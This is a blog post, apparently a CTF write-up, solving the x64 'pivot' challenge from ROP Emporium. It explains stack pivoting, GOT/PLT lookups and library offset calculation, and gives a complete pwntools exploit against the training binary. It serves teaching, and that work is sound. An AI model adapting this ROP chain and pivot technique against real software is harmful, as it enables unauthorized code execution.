---
layout: post
title:  "ROP Emporium pivot Writeup (x64)"
date:   2024-06-07 00:00:00 -0400
categories: rop-emporium challenge-7
tags: rop-emporium pivot x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[seventh challenge](https://ropemporium.com/challenge/pivot.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

According to the
[challenge page](https://ropemporium.com/challenge/pivot.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `ret2win` from the `libpivot` library.
This function isn't imported so we'll need to calculate
its offset from another imported function. Stack space
is also limited so we'll need to "pivot" our stack to
a new location.

> This is what a hint will look like!
{: .prompt-tip }

## Running the Program
> I believe in you, you can do this
{: .prompt-tip }
Typically these challenges follow the format of asking
the user for input and then exiting but this challenge is
slightly different

![pivot output](/images/pivot/x64-pivot-output.png)

Our first input will be copied to an address which will
change every time (likely space that was allocated on
the heap). Since this address changes, we'll need to
construct our pivot payload dynamically. This input
should contain our ROP chain which runs after
the stack pointer is changed.

The second input is where we'll start our ROP chain.
This is where we'll pivot the stack to a new address.

## Offset
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

## Useful Gadgets
> Check out `uselesssFunction`'s assembly
{: .prompt-tip }

Let's check the `usefulGadgets` section in `uselessFunction`.
We can view the assembly with the following commands in
`radare2`

```
aaa
s sym.uselessFunction
V
p
```

![useful gadgets](/images/pivot/x64-useful-gadgets.png)
> The first two gadgets will be used for stack pivoting
> and the last two for calling `ret2win`
{: .prompt-tip }

## Stack Pivoting
> Use the address provided by the program to pivot to.
> If you're stuck read the
> [pwntools documentation](https://docs.pwntools.com/en/stable/intro.html#tutorials){:target="_blank"}{:rel="noopener noreferrer"}
{: .prompt-tip }

![pivot gadgets](/images/pivot/x64-pivot-gadgets.png)

The
[xchg instruction](https://www.felixcloutier.com/x86/xchg){:target="_blank"}{:rel="noopener noreferrer"}
will exchange/swap the values of the provided registers.
With these gadgets, we have a way to control 
the stack pointer `rsp`. 

The program provides an address to switch to, but it
changes every time it's run. This means
we need to create a payload based on the output. `pwntools`
is able to read the output of a program so we can
change the stack pointer `rsp` with this python code

```python
#!/bin/python3
from pwn import *

pop_rax = 0x004009bb
xchg_rsp_rax = 0x004009bd

# set rsp to addr
def set_rsp(addr):
    payload = p64(pop_rax) + p64(addr)
    payload += p64(xchg_rsp_rax)
    return payload

# create pivot payload
io = process('./pivot')
io.recvuntil(b'pivot: ')
addr_output = io.recvline()
# remove \n and convert to number
malloc_addr = addr_output[0:-1]
malloc_addr = int(malloc_addr, 16)
pivot_payload = b'A' * 40
pivot_payload += set_rsp(malloc_addr)
```

## ret2win
After our stack pivots, it will continue to run our
ROP chain in this new location. Our next step is to
call the `ret2win` function to read the flag. The
only problem is this function isn't imported!

### Library Foothold
> Analyze the library `libpivot.so` and compare it to
> the `pivot` binary
{: .prompt-tip }

Let's see what functions from `libpivot` are available
in `pivot`. We can list functions in `radare2` with
the `afl` command

Here are the `pivot` functions
![pivot functions](/images/pivot/x64-pivot-functions.png)

And here are the `libpivot` functions
![lib functions](/images/pivot/x64-lib-functions.png)

The conveniently named `foothold_function` with the
address `0x00400720` is shared and
will give us a foothold into the library!

### Global Offset Table and Procedure Linkage Table
> Find the lookup address for `foothold_function`
{: .prompt-tip }
If you want a fuller understanding of
the `plt` (procedure linkage table) and the `got`
(global offset table) you can check the `How lazy binding
works` section in the 
[ROP Emporium Beginners Guide](https://ropemporium.com/guide.html#Appendix%20A){:target="_blank"}{:rel="noopener noreferrer"}
as well as this
[fantastic blog post](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html){:target="_blank"}{:rel="noopener noreferrer"}

Essentially, these two tables are used by the program to 
lookup function addresses from a dynamically loaded 
library. These entries are filled only when that function 
is called by the program. The base library address will
change whenever the program runs, but the `.got.plt`
location will remain the same!

The `.got.plt` section will contain our function address
after it's looked up so let's find the address which
corresponds to the `foothold_function`. Section addresses
can be found with the `iS` command

![section addr](/images/pivot/x64-section-addr.png)

The `.got.plt` address is `0x00601000` so let's investigate
this area more

![foothold got plt](/images/pivot/x64-foothold-got-plt.png)

The `.got.plt` address of the `foothold_function` is
`0x00601040`

### Library Offset
> What's the offset between `ret2win` 
> and `foothold_function`?
{: .prompt-tip }
The base address of the library `libpivot` will
change whenever the program is run. However, the
relative distance between functions will remain the same!

If we want to call a different function in the
library, we'll need to find the offset between
the `foothold_function` and our target function.
Let's check `libpivot`'s function list again

![lib functions](/images/pivot/x64-lib-functions.png)

The address of `foothold_function` is `0x0000096a`
and the address of `ret2win` is `0x00000a81`

![offset calc](/images/pivot/x64-offset-calc.png)

The offset between `ret2win` and `foothold_function`
is `279` or `0x117`. By adding this value to the
`foothold_function`'s `.got.plt` entry, we'll be
able to call `ret2win`!

### Calling ret2win
> Find the necessary gadgets and create the ROP chain
{: .prompt-tip }

Our prep work is done so now we can chain some gadgets
together. Here are the last two gadgets from the
`usefulGadgets` section

![ret2win gadgets](/images/pivot/x64-ret2win-gadgets.png)

The first gadget, `mov rax, qword [rax]`, will give us
a way to read a value at an address. Perfect for
reading the `foothold_function`'s `.got.plt` entry!

The second gadget, `add rax, rbp`, will give us a way
to apply our calculated offset to the `foothold_function`
address.

What we need now are ways to set `rbp`, along with a 
way to jump to our new address.

> We already have a `pop rax` gadget from our
> stack pivot payload!
{: .prompt-info }

Let's start with looking for a `pop rbp` gadget

```
/R pop rbp
```

![pop rbp](/images/pivot/x64-pop-rbp.png)

Alright we have enough gadgets to calculate the address
for `ret2win`, now we need a gadget to jump to it

```
/R jmp rax
```

![jmp rax](/images/pivot/x64-jmp-rax.png)

Combining these gadgets with our curated values we
can construct a payload to call `ret2win`!

```python
#!/bin/python3
from pwn import *

pop_rax = 0x004009bb
add_rax_rbp = 0x004009c4
pop_rbp = 0x00400829
jmp_rax = 0x00400803
dereference_rax = 0x004009c0
foothold_got_plt = 0x601040
foothold_addr = 0x00400720
ret2win_offset = 0x117

# create flag payload
# call foothold_function() to lookup
# current .got.plt address
flag_payload = p64(foothold_addr)
# calculate ret2win address
flag_payload += p64(pop_rax) + p64(foothold_got_plt)
flag_payload += p64(dereference_rax)
flag_payload += p64(pop_rbp) + p64(ret2win_offset)
flag_payload += p64(add_rax_rbp)
# call ret2win
flag_payload += p64(jmp_rax)
```

## Exploit
We have everything we need to build our exploit

```python
#!/bin/python3
from pwn import *

pop_rax = 0x004009bb
add_rax_rbp = 0x004009c4
xchg_rsp_rax = 0x004009bd
pop_rbp = 0x00400829
jmp_rax = 0x00400803
dereference_rax = 0x004009c0
foothold_got_plt = 0x601040
foothold_addr = 0x00400720
ret2win_offset = 0x117

# set rsp to addr
def set_rsp(addr):
    payload = p64(pop_rax) + p64(addr)
    payload += p64(xchg_rsp_rax)
    return payload

# create pivot payload
io = process('./pivot')
io.recvuntil(b'pivot: ')
addr_output = io.recvline()
# remove \n and convert to number
malloc_addr = addr_output[0:-1]
malloc_addr = int(malloc_addr, 16)
pivot_payload = b'A' * 40
pivot_payload += set_rsp(malloc_addr)

# create flag payload
# call foothold_function() to lookup
# the current function address
flag_payload = p64(foothold_addr)
# calculate ret2win address
flag_payload += p64(pop_rax) + p64(foothold_got_plt)
flag_payload += p64(dereference_rax)
flag_payload += p64(pop_rbp) + p64(ret2win_offset)
flag_payload += p64(add_rax_rbp)
# call ret2win
flag_payload += p64(jmp_rax)

# send payloads + receive flag
io.send(flag_payload)
io.recvuntil(b'>')
io.send(pivot_payload)
io.recvuntil(b'pivot\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![x64 flag](/images/pivot/x64-flag.png)

## Conclusion
In this challenge we learned how to call non imported
functions from a library by using an offset, as well
as how to pivot the stack from a new location to gain
more space. The next and final challenge will go over
constructing ROP chains with a limited number of
available gadgets.

[Previous Challenge (fluff)]({% post_url 2024-06-06-rop-emporium-fluff-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[Next Challenge (ret2csu)]({% post_url 2024-06-10-rop-emporium-ret2csu-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[pivot x86]({% post_url 2024-06-07-rop-emporium-pivot-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
